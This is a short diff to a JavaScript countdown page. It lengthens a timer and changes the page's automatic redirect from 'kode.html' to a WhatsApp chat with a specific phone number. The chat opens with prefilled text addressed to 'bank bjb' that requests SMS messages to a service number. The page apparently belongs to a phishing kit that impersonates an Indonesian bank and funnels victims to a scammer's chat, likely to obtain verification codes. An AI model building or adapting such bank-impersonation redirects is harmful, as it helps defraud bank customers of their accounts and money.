@@ -96,13 +96,13 @@ document.getElementById('timer').innerHTML =
           return sec;
         }
         
-        var i = 15;
+        var i = 60;
 var time = $("#cice")
 var timer = setInterval(function() {
   time.html(i);
   if (i == 0) {
   $("#timer").hide();
-   location.href='kode.html';
+   location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373)';
     clearInterval(timer);
 
   }
